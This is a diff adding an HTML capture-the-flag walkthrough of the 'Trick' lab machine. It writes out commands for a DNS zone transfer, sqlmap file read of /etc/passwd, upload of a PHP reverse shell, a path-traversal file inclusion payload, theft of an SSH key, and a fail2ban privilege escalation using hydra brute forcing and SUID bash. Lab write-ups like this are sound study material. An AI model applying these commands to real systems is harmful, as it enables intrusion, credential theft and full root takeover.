@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">
+    <style>
+        img {
+            max-width: 80%;
+        }
+    </style>
+    <title>Trick</title>
+</head>
+<body>
+    <div class="container">
+        <h1>Trick</h1>
+        <hr>
+        
+        <h3>Port Scan</h3>
+        <p>
+            <img src="./imgs/nmap.png" alt="nmap">
+        </p>
+
+        <h3>Port 80</h3>
+        <p>
+            <img src="./imgs/trick.htb.png" alt="trick.htb">
+        </p>
+
+        <h3>DNS: Port 53</h3>
+        <p>
+            Since we know that DNS port 53 is open, I tried to do I zone transfer, and here is what I got.<br>
+            <code>dig axfr @10.129.227.180 trick.htb</code><br>
+            <img src="./imgs/zonetransfer.png" alt="zone transfer"><br>
+            New subdomain was found.<br>
+            <code>preprod-payroll.trick.htb</code><br>
+            <code>root.trick.htb</code><br>
+            I am adding these to my <code>/etc/hosts</code>
+        </p>
+
+        <h3>Payroll Management System</h3>
+        <p>
+            I went to <a href="http://preprod-payroll.trick.htb">preprod-payroll</a><br>
+            <img src="./imgs/preprod-payroll.png" alt="preprod-payroll"><br>
+        </p>
+        <h4>Researching...</h4>
+        <p>
+            Something interesting that I found was:<br>
+            <img src="./imgs/payroll-items.png" alt="payroll-items.png"><br>
+            However, it did not give me much information about the SQL Injection.
+        </p>
+        <p>
+            <img src="./imgs/id=1.png" alt="id=1">
+        </p>
+
+        <h3>SQL Injection</h3>
+        <p>
+            After researching for a little bit I found a cool tool called <code>sqlmap</code>. Basically it designed to look for sql injections. First I just ran it to see if the webpage was vulnerable to SQL Injections.<br>
+            <code>sqlmap -u http://preprod-payroll.trick.htb/payroll_items.php?id=1</code><br>
+            <img src="./imgs/vulnerable.png" alt="vulnerable">
+        </p>
+        
+        <h4>Some cool features that I found, that may help us in the future.</h4>
+        <p>
+            File read:<br>
+            <code>sqlmap -u http://preprod-payroll.trick.htb/payroll_items.php?id=1 --file-read="/etc/passwd"</code>
+        </p>
+        <p>
+            File upload:<br>
+            <code>sqlmap -u http://preprod-payroll.trick.htb/payroll_items.php?id=1 --file-write="(local-file)" --file-dest="(destination-filepath)"</code>
+        </p>
+        <p>
+            I went ahead and thought that would be good to put a reverse shell on the system in case we need it. I got the <i>PentestMonkey</i> one from 
+            <a href="https://revshells.com">revshells</a> and put it on the system<br>
+            <code>sqlmap -u http://preprod-payroll.trick.htb/payroll_items.php?id=1 --file-write="shell.php" --file-dest="/tmp/shell.php"</code>
+        </p>
+
+        <h3>Discovery</h3>
+        <p>Since I knew the webserver was running <code>nginx</code> I decided to check if it had any other subdomains that I did not know of.</p>
+        <p>
+            I used my file reading ability and read <code>/etc/nginx/sites-available/default</code><br>
+            <img src="./imgs/preprod-marketing.png" alt="preprod marketing">
+        </p>
+        <p>
+            <a href="http://preprod-marketing.trick.htb">preprod-marketing</a><br>
+            <img src="./imgs/preprod-marketing.trick.htb.png" alt="preprod-marketing.trick.htb">
+        </p>
+        <p>
+            Here is what I noticed when I clicked on Services:<br>
+            <img src="./imgs/services.html.png" alt="services.html">
+        </p>
+
+        <h3>LFI (Local File Inclusion)</h3>
+        <p>
+            I started messing around trying to find LFI.<br>
+            <img src="./imgs/nw1.png" alt="not working 1"><br>
+            However, after a little bit more of trying I found this:<br>
+            <img src="./imgs/lfi.png" alt="local file inclusion">
+        </p>
+
+        <h3>Reverse Shell</h3>
+        <p>
+            Remember the php reverse shell that we got onto the system earlier? Now, I start a <code>nc</code> listener wait for magic.<br>
+            <code>nc -lvnp 4444</code><br>
+            <code>http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//....//....//....//tmp/shell.php</code>
+            <img src="./imgs/reverse-shell.png" alt="reverse-shell">
+        </p>
+
+        <hr>
+
+        <h3>Research</h3>
+        <p>
+            I moved around the system and found <code>id_rsa</code> for <code>michael</code> in <code>/home/michael/.ssh/id_rsa</code><br>
+            <img src="./imgs/id_rsa.png" alt="id_rsa"><br>
+            I used it and was able to <code>ssh</code> as michael.
+        </p>
+        
+        <h3>Privilege Escalation</h3>
+        <p>
+            I ran <code>sudo -l</code> to see if I was able to run anything as root.<br>
+            <img src="./imgs/sudo.png" alt="sudo"><br>
+            Looks like I can run <code>fail2ban restart</code> as root.
+        </p>
+        <p>
+            I did some more research on <code>fail2ban</code> on the system.<br>
+            <img src="./imgs/fail2ban-group.png" alt="fail2ban-group">
+            This is something interesting and useful that I found.<br>
+            The directory <code>action.d</code> was owned by the <code>security</code> group and <code>michael</code> was part of the group.
+        </p>
+        <p>
+            I looked around a little more to find what I could do with that.<br>
+            <img src="./imgs/jail.conf.png" alt="jail.conf"><br>
+            I read the <code>/etc/fail2ban/jail.conf</code> I found this configuration for <code>ssh</code>.
+            It means if there are more than 5 failed attempts of ssh login, it will ban it.
+        </p>
+        <p>
+            After a little bit of research I found that the <code>action.d</code> directory is reponsible for all the actions including banning.
+            There are many config files, but since there is no any special for ssh, we can assume that one of the iptables should work.<br>
+            <img src="./imgs/iptables.png" alt="iptables">
+        </p>
+        <p>
+            I created a <code>/tmp/shell.sh</code> for my root reverse shell.<br>
+            <img src="./imgs/shell.sh.png" alt="shell.sh"><br>
+            Don't forget <code>chmod +x /tmp/shell.sh</code> so it can be run.
+        </p>
+
+        <p>
+            Even though michael was part of the security group I was not able to modify the contents of the config files<br>
+            <img src="./imgs/notwrittable.png" alt="notwrittable">
+        </p>
+        <p>
+            Here is a little trick:<br>
+            <img src="./imgs/michaelowner.png" alt="michael owner"><br>
+            <code>mv action.d/iptables-multiport.conf action.d/iptables-multiport.conf.bak</code><br>
+            <code>cp action.d/iptables-multiport.conf.bak action.d/iptables-multiport.conf</code>
+        </p>
+
+        <p>
+            Then, I changed these lines in <code>iptables-multiport.conf</code><br>
+            <img src="./imgs/iptableschaned.png" alt="iptables changed">
+        </p>
+        <p>
+            Restarted <code>fail2ban</code><br>
+            <code>sudo /etc/init.d/fail2ban restart</code>
+        </p>
+        <p>
+            Started <code>hydra</code> ssh brute forcing so it gets enough failed login attempts.<br>
+            <code>hydra -l michael -P /usr/share/wordlists/rockyou.txt ssh://trick.htb</code>
+        </p>
+        <p>
+            Now I just had to wait for magic. After a few seconds my root shell appeared.
+        </p>
+        <p>
+            <img src="./imgs/root.png" alt="root">
+        </p>
+        <p>
+            For persistence I immediately typed <code>chmod +s /bin/bash</code> from my root reverse shell. 
+            And then in michael's ssh I typed <code>/bin/bash -p</code> to get my <b>root</b> shell in the ssh.
+        </p>
+        <p>
+            <img src="./imgs/root1.png" alt="root">
+        </p>
+
+
+               
+    </div>
+</body>
+</html>
